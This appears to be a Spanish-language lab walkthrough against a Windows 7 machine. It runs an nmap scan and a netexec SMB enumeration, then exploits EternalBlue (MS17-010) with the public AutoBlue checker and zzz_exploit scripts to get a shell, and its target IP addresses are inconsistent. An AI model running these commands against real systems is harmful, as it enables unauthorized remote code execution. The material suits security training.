[[192.168.100.7(Nagini)]]

Haremos un scaneo de red con [[NMAP]]
`nmap -sT -Pn --top-ports 500 --open -T5 -v -n 192.168.100.9`

```python
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
554/tcp  open  rtsp
5357/tcp open  wsdapi
```

Para enumerar el servicio SMB usaremos [[CRACKMAPEXEC-NETEXEC]] con:
`netexec smb 192.168.100.4 2>/dev/null`
```python
SMB 192.168.100.4 445 DUMBLEDORE-PC    
[*] Windows 7 / Server 2008 R2 Build 7601 x64 
(name:DUMBLEDORE-PC) 
(domain:Dumbledore-PC) 
(signing:False) 
(SMBv1:True) 
```

Estamos ante un Windows 7 con el puerto SMB expuesto.
Como es una versión y un puerto vulnerables vamos a realizar un ataque de eternalBlue
Usáremos el repositorio de GitHub: `https://github.com/3ndG4me/AutoBlue-MS17-010`
Dentro de esta herramienta usaremos primero `eternal_checker.py` usaremos para saber si la maquina es vulnerable: `python3 eternal_checker.py 192.168.100.9`

Ahora automatizaremos el proceso de obtener una consola interactiva con la herramienta `zzz_exploit.py` ejecutándola con `python3 zzz_exploit.py 192.168.100.9`

